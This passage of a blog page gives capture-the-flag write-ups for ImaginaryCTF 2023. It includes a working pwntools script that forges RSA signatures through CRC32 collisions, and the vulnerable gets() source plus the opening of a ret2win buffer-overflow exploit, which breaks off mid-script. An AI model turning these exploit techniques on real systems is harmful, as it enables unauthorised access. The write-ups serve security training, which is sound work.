class=md-nav__link> 王子亭的博客 GPG 与端到端加密：论什么才是可以信任的 </a> </li> <li class=md-nav__item> <a href=../../other/nc%3A%20invalid%20option%20%E2%80%94%20%E2%80%98-%E2%80%98/ class=md-nav__link> Nc: invalid option — ‘ ‘ </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6 type=checkbox id=__nav_6 checked> <label class=md-nav__link for=__nav_6> CTF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=CTF data-md-level=1> <label class=md-nav__title for=__nav_6> <span class="md-nav__icon md-icon"></span> CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../MapleCTF2022_brsaby/ class=md-nav__link> MapleCTF2022 brsaby </a> </li> <li class=md-nav__item> <a href=../SHELLCTF2022_World%27s_greatest_detective/ class=md-nav__link> World's greatest detective </a> </li> <li class=md-nav__item> <a href=../SHELLCTF2022_Extractor/ class=md-nav__link> Extractor </a> </li> <li class=md-nav__item> <a href=../SHELLCTF2022_swift/ class=md-nav__link> swift </a> </li> <li class=md-nav__item> <a href=../SHELLCTF2022_tea/ class=md-nav__link> tea </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> ImaginaryCTF 2023 <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> ImaginaryCTF 2023 </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#rsa class=md-nav__link> RSA </a> </li> <li class=md-nav__item> <a href=#signer class=md-nav__link> Signer </a> </li> <li class=md-nav__item> <a href=#ret2win class=md-nav__link> Ret2win </a> </li> <li class=md-nav__item> <a href=#ret2lose class=md-nav__link> Ret2lose </a> </li> <li class=md-nav__item> <a href=#tan class=md-nav__link> TAN </a> </li> <li class=md-nav__item> <a href=#perfect-picture class=md-nav__link> Perfect Picture </a> </li> <li class=md-nav__item> <a href=#dantectf-helljail-tfcctf-my-first-calculator class=md-nav__link> DanteCTF-HellJail TFCCTF-MY FIRST CALCULATOR </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_7 type=checkbox id=__nav_7> <label class=md-nav__link for=__nav_7> 功防世界 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=功防世界 data-md-level=1> <label class=md-nav__title for=__nav_7> <span class="md-nav__icon md-icon"></span> 功防世界 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902/ class=md-nav__link> Misc 流量分析2 </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E4%B8%80%E7%BB%9F%E5%A4%A9%E4%B8%8B/ class=md-nav__link> Mobile 一统天下 </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/pwn_littleof/ class=md-nav__link> littleof </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/reverse_re3/ class=md-nav__link> reverse_re3 迷宫 </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E5%9F%BA%E7%A1%80android/ class=md-nav__link> Mobile 基础android </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Decrypt-It-easy/ class=md-nav__link> Crypto Decrypt It easy </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Easy_Crypto/ class=md-nav__link> Crypto Easy Crypto </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_Android2.0/ class=md-nav__link> mobile Android2.0 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_8 type=checkbox id=__nav_8> <label class=md-nav__link for=__nav_8> 其它 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=其它 data-md-level=1> <label class=md-nav__title for=__nav_8> <span class="md-nav__icon md-icon"></span> 其它 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../other/How%20to%20Get%20Rich/ class=md-nav__link> How to Get Rich </a> </li> <li class=md-nav__item> <a href=../../other/TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/ class=md-nav__link> TOP 11 Deep Web Search Engine Alternative for Google and Bing 2021 </a> </li> <li class=md-nav__item> <a href=../../other/FFmpeg%E5%8A%9F%E8%83%BD%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/ class=md-nav__link> FFmpeg功能命令汇总 </a> </li> <li class=md-nav__item> <a href=../../other/%E4%B8%8D%E6%80%95%E5%A5%B8%E5%95%86%20%E6%8F%AD%E5%90%84%E5%93%81%E7%89%8C%E7%94%B5%E8%A7%86%E8%BF%9B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E6%96%B9%E6%B3%95/ class=md-nav__link> 不怕奸商 揭各品牌电视进工厂模式方法 </a> </li> <li class=md-nav__item> <a href=../../other/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/ class=md-nav__link> 傅里叶变换 </a> </li> <li class=md-nav__item> <a href=../../other/%E6%BB%A4%E6%B3%A2%E5%99%A8/ class=md-nav__link> 滤波器 </a> </li> <li class=md-nav__item> <a href=../../other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/ class=md-nav__link> 蓝牙协议入门（一）简介 </a> </li> <li class=md-nav__item> <a href=../../other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/ class=md-nav__link> 蓝牙协议入门（二）传输层协议 </a> </li> <li class=md-nav__item> <a href=../../other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/ class=md-nav__link> 蓝牙协议入门（三）中介层协议 </a> </li> <li class=md-nav__item> <a href=../../other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/ class=md-nav__link> 蓝牙协议入门（四）应用层协议 </a> </li> <li class=md-nav__item> <a href=../../other/TarsosDSP%20%E7%AE%80%E4%BB%8B%203.TarsosDSP%20%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/ class=md-nav__link> TarsosDSP 简介 3.TarsosDSP 是如何工作的？ </a> </li> <li class=md-nav__item> <a href=../../tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/ class=md-nav__link> 实战rfc5766 turn server和ice4j广域网通讯 </a> </li> <li class=md-nav__item> <a href=../../other/%E6%B3%A2%E9%BB%91%E5%9B%B4%E5%9F%8E%E6%88%98%E4%B8%AD%E7%9A%84%E5%B9%B8%E5%AD%98%E8%80%85/ class=md-nav__link> 波黑围城战中的幸存者 </a> </li> <li class=md-nav__item> <a href=../../other/%E6%AD%A6%E6%B1%89%EF%BC%9A%E7%99%BE%E5%B9%B4%E7%9A%84%E6%B4%AA%E6%B0%B4%E8%AE%B0%E5%BF%86/ class=md-nav__link> 武汉：百年的洪水记忆 </a> </li> <li class=md-nav__item> <a href=../../Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/ class=md-nav__link> Python制作pdf电子书 </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#rsa class=md-nav__link> RSA </a> </li> <li class=md-nav__item> <a href=#signer class=md-nav__link> Signer </a> </li> <li class=md-nav__item> <a href=#ret2win class=md-nav__link> Ret2win </a> </li> <li class=md-nav__item> <a href=#ret2lose class=md-nav__link> Ret2lose </a> </li> <li class=md-nav__item> <a href=#tan class=md-nav__link> TAN </a> </li> <li class=md-nav__item> <a href=#perfect-picture class=md-nav__link> Perfect Picture </a> </li> <li class=md-nav__item> <a href=#dantectf-helljail-tfcctf-my-first-calculator class=md-nav__link> DanteCTF-HellJail TFCCTF-MY FIRST CALCULATOR </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h1>ImaginaryCTF 2023</h1> <p>ImaginaryCTF-2023</p> <h4 id=rsa>RSA</h4> <p>We are given a encrypted flag <code>flag.enc</code>, private key <code>private.pem</code> and public key <code>public.pem</code></p> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a>    % openssl rsa -in private.pem -text -noout  
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a>    Private-Key: (1024 bit, 2 primes)
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a>    modulus:
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a>    ...
<a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a>    ...
<a id=__codelineno-0-6 name=__codelineno-0-6 href=#__codelineno-0-6></a>
<a id=__codelineno-0-7 name=__codelineno-0-7 href=#__codelineno-0-7></a>    % openssl pkeyutl -decrypt -in flag.enc -inkey private.pem 
<a id=__codelineno-0-8 name=__codelineno-0-8 href=#__codelineno-0-8></a>    Public Key operation error
<a id=__codelineno-0-9 name=__codelineno-0-9 href=#__codelineno-0-9></a>    007EB11801000000:error:0200009F:rsa routines:RSA_padding_check_PKCS1_type_2:pkcs decoding error:crypto/rsa/rsa_pk1.c:269:
<a id=__codelineno-0-10 name=__codelineno-0-10 href=#__codelineno-0-10></a>    007EB11801000000:error:02000072:rsa routines:rsa_ossl_private_decrypt:padding check failed:crypto/rsa/rsa_ossl.c:499:
<a id=__codelineno-0-11 name=__codelineno-0-11 href=#__codelineno-0-11></a>
<a id=__codelineno-0-12 name=__codelineno-0-12 href=#__codelineno-0-12></a>
<a id=__codelineno-0-13 name=__codelineno-0-13 href=#__codelineno-0-13></a>    % openssl pkeyutl -decrypt -in flag.enc -inkey private.pem -pkeyopt rsa_padding_mode:none
<a id=__codelineno-0-14 name=__codelineno-0-14 href=#__codelineno-0-14></a>    ictf{keep_your_private_keys_private}%   
</code></pre></div> <h4 id=signer>Signer</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a>    # Standard RSA stuff
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a>    p, q = getPrime(1024), getPrime(1024)
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a>    n = p*q
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a>    e = 65537
<a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a>    d = pow(e, -1, (p-1)*(q-1))
<a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a>
<a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a>    PASSWORD = b&quot;give me the flag!!!&quot;
<a id=__codelineno-1-8 name=__codelineno-1-8 href=#__codelineno-1-8></a>
<a id=__codelineno-1-9 name=__codelineno-1-9 href=#__codelineno-1-9></a>    # &lt;snip&gt;
<a id=__codelineno-1-10 name=__codelineno-1-10 href=#__codelineno-1-10></a>
<a id=__codelineno-1-11 name=__codelineno-1-11 href=#__codelineno-1-11></a>    while True:
<a id=__codelineno-1-12 name=__codelineno-1-12 href=#__codelineno-1-12></a>    print(&quot;1. Sign&quot;)
<a id=__codelineno-1-13 name=__codelineno-1-13 href=#__codelineno-1-13></a>    print(&quot;2. Get flag&quot;)
<a id=__codelineno-1-14 name=__codelineno-1-14 href=#__codelineno-1-14></a>    choice = int(input())
<a id=__codelineno-1-15 name=__codelineno-1-15 href=#__codelineno-1-15></a>
<a id=__codelineno-1-16 name=__codelineno-1-16 href=#__codelineno-1-16></a>    if choice == 1:
<a id=__codelineno-1-17 name=__codelineno-1-17 href=#__codelineno-1-17></a>        print(&quot;Enter message:&quot;)
<a id=__codelineno-1-18 name=__codelineno-1-18 href=#__codelineno-1-18></a>        message = input().encode()
<a id=__codelineno-1-19 name=__codelineno-1-19 href=#__codelineno-1-19></a>        # crc32 is secure and has no collisions, but just in case
<a id=__codelineno-1-20 name=__codelineno-1-20 href=#__codelineno-1-20></a>        if message == PASSWORD or crc32(message) == crc32(PASSWORD):
<a id=__codelineno-1-21 name=__codelineno-1-21 href=#__codelineno-1-21></a>        print(&quot;Stop this trickery!&quot;)
<a id=__codelineno-1-22 name=__codelineno-1-22 href=#__codelineno-1-22></a>        exit()
<a id=__codelineno-1-23 name=__codelineno-1-23 href=#__codelineno-1-23></a>        print(&quot;Signature:&quot;, pow(crc32(message), d, n))
<a id=__codelineno-1-24 name=__codelineno-1-24 href=#__codelineno-1-24></a>    elif choice == 2:
<a id=__codelineno-1-25 name=__codelineno-1-25 href=#__codelineno-1-25></a>        print(&quot;Enter the signature for the password:&quot;)
<a id=__codelineno-1-26 name=__codelineno-1-26 href=#__codelineno-1-26></a>        s = int(input())
<a id=__codelineno-1-27 name=__codelineno-1-27 href=#__codelineno-1-27></a>        if pow(s, e, n) == crc32(PASSWORD):
<a id=__codelineno-1-28 name=__codelineno-1-28 href=#__codelineno-1-28></a>        print(&quot;You win! The flag is&quot;, open(&quot;flag.txt&quot;).read())
<a id=__codelineno-1-29 name=__codelineno-1-29 href=#__codelineno-1-29></a>        exit()
<a id=__codelineno-1-30 name=__codelineno-1-30 href=#__codelineno-1-30></a>        else:
<a id=__codelineno-1-31 name=__codelineno-1-31 href=#__codelineno-1-31></a>        print(&quot;Wrong.&quot;)
<a id=__codelineno-1-32 name=__codelineno-1-32 href=#__codelineno-1-32></a>        exit()
</code></pre></div> <p>The challenge source shows that the challenge server is doing the following processing.</p> <ol> <li>Establishes a standard RSA setup with two 1024-bit primes.</li> <li>The source also establishes a password <code>b"give me the flag!!!"</code></li> <li>We are expected to provide an integer <code>s</code>, which, when encoded with the RSA parameters, would be equal to the CRC32 of the password.</li> <li>To assist in this endeavor, the challenge server will verify any value we give it, as long as it is not the password or share the CRC32 value with the password. This is a safe move because the funny comment in the source saying <code>crc32 is secure and has no collisions, but just in case</code>. CRC32 is definitely not collision free and it is not secure to be tamper resistant.</li> <li>Note that the operation under option #1 is the inverse of the signing operation, i.e CRCstringdmod  NCRC_{string}^d \mod N for any string we pass in.</li> <li>The solution is rather simple. We need to supply ss such that semod  N\=\=CRCpasswords^e \mod N == CRC_{password}</li> <li>Let’s factor the CRCpasswordCRC_{password}, such that CRCpassword\=C1∗C2CRC_{password} = C_1 * C_2</li> <li>If we can determine two strings T1 and T2T_1~and~T_2, such that their CRCs are deterministic and can be set to C1andC2C_1 and C_2 respectively.</li> <li>Then if their corresponding signatures are S1andS2S_1 and S_2, then the desired signature of the password s\=S1∗S2s = S_1 * S_2 due to the multiplicative property of modulus.</li> <li>There are a number of reverse CRC32 implementations on GitHub. I used <a href=https://github.com/theonlypwner/crc32>https://github.com/theonlypwner/crc32</a></li> </ol> <p>The steps used are :</p> <div class=highlight><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a>In [2]: PASSWORD = b&quot;give me the flag!!!&quot;
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a>In [3]: crc32(PASSWORD)
<a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a>Out[3]: 3542523789
<a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a>In [4]: assert 87619 * 40431 == crc32(PASSWORD)
<a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a>In [5]: print(87619 * 40431 == crc32(PASSWORD) )
<a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a>True
</code></pre></div> <div class=highlight><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a>% crc32.py reverse 87619
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a>    4 bytes: {0xfc, 0xdb, 0x3c, 0xd3}
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a>    verification checksum: 0x00015643 (OK)
<a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a>    ...
<a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a>    6 bytes: BeSqrm (OK)
<a id=__codelineno-3-6 name=__codelineno-3-6 href=#__codelineno-3-6></a>    ...
<a id=__codelineno-3-7 name=__codelineno-3-7 href=#__codelineno-3-7></a>
<a id=__codelineno-3-8 name=__codelineno-3-8 href=#__codelineno-3-8></a>% crc32.py reverse 40431
<a id=__codelineno-3-9 name=__codelineno-3-9 href=#__codelineno-3-9></a>    4 bytes: {0xf8, 0x58, 0xe3, 0xc2}
<a id=__codelineno-3-10 name=__codelineno-3-10 href=#__codelineno-3-10></a>    verification checksum: 0x00009def (OK)
<a id=__codelineno-3-11 name=__codelineno-3-11 href=#__codelineno-3-11></a>    ...
<a id=__codelineno-3-12 name=__codelineno-3-12 href=#__codelineno-3-12></a>    6 bytes: ZJWWgU (OK)
<a id=__codelineno-3-13 name=__codelineno-3-13 href=#__codelineno-3-13></a>    ...
</code></pre></div> <p>Now that we know that strings <code>BeSqrm</code> and <code>ZJWWgU</code> will produce CRC values, which when multiplied together gives the CRC value of the PASSWORD, we are ready to code the exploit.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a>PASSWORD = b&quot;give me the flag!!!&quot;
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a>mP = crc32(PASSWORD)
<a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a># crc32.py reverse 87619      
<a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a># crc32.py reverse 40431
<a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a>p1,p2 = b&#39;BeSqrm&#39;, b&#39;ZJWWgU&#39;
<a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a>
<a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a>mp1,mp2 = crc32(p1), crc32(p2)
<a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a>
<a id=__codelineno-4-9 name=__codelineno-4-9 href=#__codelineno-4-9></a># ensure that the CRC values are indeed factors of the CRC value of the PASSWORD
<a id=__codelineno-4-10 name=__codelineno-4-10 href=#__codelineno-4-10></a>assert mp1 * mp2 == mP
<a id=__codelineno-4-11 name=__codelineno-4-11 href=#__codelineno-4-11></a>
<a id=__codelineno-4-12 name=__codelineno-4-12 href=#__codelineno-4-12></a>print(f&quot;Desired CRC: {mP} \n Factors: {mp1} * {mp2}&quot;)
<a id=__codelineno-4-13 name=__codelineno-4-13 href=#__codelineno-4-13></a>
<a id=__codelineno-4-14 name=__codelineno-4-14 href=#__codelineno-4-14></a>s1 = 0
<a id=__codelineno-4-15 name=__codelineno-4-15 href=#__codelineno-4-15></a>s2 = 0
<a id=__codelineno-4-16 name=__codelineno-4-16 href=#__codelineno-4-16></a>
<a id=__codelineno-4-17 name=__codelineno-4-17 href=#__codelineno-4-17></a>with remote(&#39;signer.chal.imaginaryctf.org&#39;,  1337) as P:
<a id=__codelineno-4-18 name=__codelineno-4-18 href=#__codelineno-4-18></a>    P.recvuntil(b&#39;Get flag&#39;)
<a id=__codelineno-4-19 name=__codelineno-4-19 href=#__codelineno-4-19></a>    P.sendline(b&#39;1&#39;)
<a id=__codelineno-4-20 name=__codelineno-4-20 href=#__codelineno-4-20></a>    P.recvuntil(b&#39;Enter message:&#39;)
<a id=__codelineno-4-21 name=__codelineno-4-21 href=#__codelineno-4-21></a>    P.sendline(p1)
<a id=__codelineno-4-22 name=__codelineno-4-22 href=#__codelineno-4-22></a>    P.recvuntil(b&#39;Signature: &#39;)
<a id=__codelineno-4-23 name=__codelineno-4-23 href=#__codelineno-4-23></a>    s1 = int(P.recvline().decode().strip())
<a id=__codelineno-4-24 name=__codelineno-4-24 href=#__codelineno-4-24></a>    print(f&quot;Received sig1: {s1}&quot;)
<a id=__codelineno-4-25 name=__codelineno-4-25 href=#__codelineno-4-25></a>
<a id=__codelineno-4-26 name=__codelineno-4-26 href=#__codelineno-4-26></a>    P.recvuntil(b&#39;Get flag&#39;)
<a id=__codelineno-4-27 name=__codelineno-4-27 href=#__codelineno-4-27></a>    P.sendline(b&#39;1&#39;)
<a id=__codelineno-4-28 name=__codelineno-4-28 href=#__codelineno-4-28></a>    P.recvuntil(b&#39;Enter message:&#39;)
<a id=__codelineno-4-29 name=__codelineno-4-29 href=#__codelineno-4-29></a>    P.sendline(p2)
<a id=__codelineno-4-30 name=__codelineno-4-30 href=#__codelineno-4-30></a>    P.recvuntil(b&#39;Signature: &#39;)
<a id=__codelineno-4-31 name=__codelineno-4-31 href=#__codelineno-4-31></a>    s2 = int(P.recvline().decode().strip())
<a id=__codelineno-4-32 name=__codelineno-4-32 href=#__codelineno-4-32></a>    print(f&quot;Received sig2: {s2}&quot;)
<a id=__codelineno-4-33 name=__codelineno-4-33 href=#__codelineno-4-33></a>
<a id=__codelineno-4-34 name=__codelineno-4-34 href=#__codelineno-4-34></a>    # Multiply the two signatures together
<a id=__codelineno-4-35 name=__codelineno-4-35 href=#__codelineno-4-35></a>    s = s1 * s2 
<a id=__codelineno-4-36 name=__codelineno-4-36 href=#__codelineno-4-36></a>
<a id=__codelineno-4-37 name=__codelineno-4-37 href=#__codelineno-4-37></a>    print(f&quot;Will send: {s}&quot;)
<a id=__codelineno-4-38 name=__codelineno-4-38 href=#__codelineno-4-38></a>
<a id=__codelineno-4-39 name=__codelineno-4-39 href=#__codelineno-4-39></a>    P.recvuntil(b&#39;Get flag&#39;)
<a id=__codelineno-4-40 name=__codelineno-4-40 href=#__codelineno-4-40></a>    P.sendline(b&#39;2&#39;)
<a id=__codelineno-4-41 name=__codelineno-4-41 href=#__codelineno-4-41></a>    P.recvuntil(b&#39;for the password:&#39;)
<a id=__codelineno-4-42 name=__codelineno-4-42 href=#__codelineno-4-42></a>    P.sendline(str(s).encode())
<a id=__codelineno-4-43 name=__codelineno-4-43 href=#__codelineno-4-43></a>    P.interactive()
<a id=__codelineno-4-44 name=__codelineno-4-44 href=#__codelineno-4-44></a>
<a id=__codelineno-4-45 name=__codelineno-4-45 href=#__codelineno-4-45></a>    # [*] Switching to interactive mode
<a id=__codelineno-4-46 name=__codelineno-4-46 href=#__codelineno-4-46></a>    # You win! The flag is ictf{m4ybe_crc32_wasnt_that_secure_after_all_1ab93213}
</code></pre></div> <h4 id=ret2win>Ret2win</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a>Description
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a>
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a>Can you overflow the buffer and get the flag? (Hint: if your exploit isn&#39;t working on the remote server, look into stack alignment)
</code></pre></div> <p>This is a simple ret2win challenge. The source code of the challenge is as follows.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;stdio.h&gt;</span><span class=cp></span>
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a><span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;unistd.h&gt;</span><span class=cp></span>
<a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a>
<a id=__codelineno-6-4 name=__codelineno-6-4 href=#__codelineno-6-4></a><span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w></span>
<a id=__codelineno-6-5 name=__codelineno-6-5 href=#__codelineno-6-5></a><span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span><span class=w></span>
<a id=__codelineno-6-6 name=__codelineno-6-6 href=#__codelineno-6-6></a><span class=w>  </span><span class=n>gets</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span><span class=w></span>
<a id=__codelineno-6-7 name=__codelineno-6-7 href=#__codelineno-6-7></a><span class=p>}</span><span class=w></span>
<a id=__codelineno-6-8 name=__codelineno-6-8 href=#__codelineno-6-8></a>
<a id=__codelineno-6-9 name=__codelineno-6-9 href=#__codelineno-6-9></a><span class=kt>int</span><span class=w> </span><span class=nf>win</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w></span>
<a id=__codelineno-6-10 name=__codelineno-6-10 href=#__codelineno-6-10></a><span class=w>  </span><span class=n>system</span><span class=p>(</span><span class=s>&quot;cat flag.txt&quot;</span><span class=p>);</span><span class=w></span>
<a id=__codelineno-6-11 name=__codelineno-6-11 href=#__codelineno-6-11></a><span class=p>}</span><span class=w></span>
</code></pre></div> <p>Additionally if we run checksec command we get the following results. <div class=highlight><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a>    Arch:     amd64-64-little
<a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a>    RELRO:    Partial RELRO
<a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a>    Stack:    No canary found
<a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a>    NX:       NX enabled
<a id=__codelineno-7-5 name=__codelineno-7-5 href=#__codelineno-7-5></a>    PIE:      No PIE (0x400000)
</code></pre></div></p> <p>Thus we can exploit the buffer overflow in the gets function to do the ret2win. If you don’t have any idea on how to do simple ret2win then I would recommend you to go through my playlist on <a href=https://keksite.in/posts/Introduction-to-pwning-1/ >Introduction to pwnning</a></p> <p>The exploit is as follows:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<a id=__codelineno-8-2 name=__codelineno-8-2 href=#__codelineno-8-2></a>
<a id=__codelineno-8-3 name=__codelineno-8-3 href=#__codelineno-8-3></a><span class=n>elf</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./vuln&quot;</span><span class=p>,</span><span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
<a id=__codelineno-8-4 name=__codelineno-8-4 href=#__codelineno-8-4></a><span class=c1># p = elf.process()</span>
<a id=__codelineno-8-5 name=__codelineno-8-5 href=#__codelineno-8-5></a><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=sa>b</span><span class=s2>&quot;ret2win.chal.imaginaryctf.org&quot;</span><span class=p>,</span> <span class=mi>1337</span><span class=p>)</span>
<a id=__codelineno-8-6 name=__codelineno-8-6 href=#__codelineno-8-6></a>
<a id=__codelineno-8-7 name=__codelineno-8-7 href=#__codelineno-8-7></a><span class=c1># gdb.attach(p,&#39;&#39;&#39;</span>
<a id=__codelineno-8-8 name=__codelineno-8-8 href=#__codelineno-8-8></a><span class=c1>#     init-gef</span>
<a id=__codelineno-8-9 name=__codelineno-8-9 href=#__codelineno-8-9></a><span class=c1>#     c           </span>
<a id=__codelineno-8-10 name=__codelineno-8-10 href=#__codelineno-8-10></a><span class=c1># &#39;&#39;&#39;)</span>
<a id=__codelineno-8-11 name=__codelineno-8-11 href=#__codelineno-8-11></a>
